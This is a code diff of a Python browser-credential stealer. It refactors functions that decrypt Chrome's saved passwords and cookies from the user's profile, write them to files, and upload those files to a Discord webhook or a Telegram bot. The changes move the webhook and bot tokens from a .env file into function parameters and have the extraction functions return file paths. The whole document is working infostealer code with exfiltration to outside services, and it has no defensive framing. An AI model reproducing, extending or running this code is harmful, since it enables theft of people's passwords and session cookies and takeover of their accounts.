@@ -9,13 +9,6 @@ from Crypto.Cipher import AES
 from pathlib import Path
 from dotenv import load_dotenv
 
-# Load environment variables
-dotenv_path = Path('env/.env')
-load_dotenv(dotenv_path=dotenv_path)
-DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
-TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
-
 windows_enviroment = {
     'app_local': 'LOCALAPPDATA',
     'app_roaming': 'APPDATA',
@@ -66,6 +59,7 @@ def extract_chrome_password():
                 password_file.write(f'URL: {app_url, relative_url}\n Username: {app_username}\n Password: {app_password}\n\n')
     connect_chrome_database.close()
     print(f"Password file created at: {password_file_path}")
+    return password_file_path
 
 def extract_chrome_cookie():
     chrome_cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
@@ -82,8 +76,9 @@ def extract_chrome_cookie():
             cookies_file.write(f"Host: {host_key}\n Cookie Name: {name}\n Cookie Value : {decrypted_cookies}\n\n")
     connect_chrome_database.close()
     print(f"Cookies file created at: {cookies_file_path}")
+    return cookies_file_path
 
-def send_file_to_discord(file_path, file_description):
+def send_file_to_discord(file_path, DISCORD_WEBHOOK_URL, file_description):
     with open(file_path, 'rb') as file:
         files = {
             'file': (os.path.basename(file_path), file)
@@ -98,7 +93,7 @@ def send_file_to_discord(file_path, file_description):
         else:
             print(f"Failed to send file {file_path} to Discord: {response.status_code}")
 
-def send_file_to_telegram(file_path, file_description):
+def send_file_to_telegram(file_path, TELEGRAM_BOT_TOKEN,TELEGRAM_CHAT_ID, file_description):
     with open(file_path, 'rb') as file:
         response = requests.post(
             f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument',
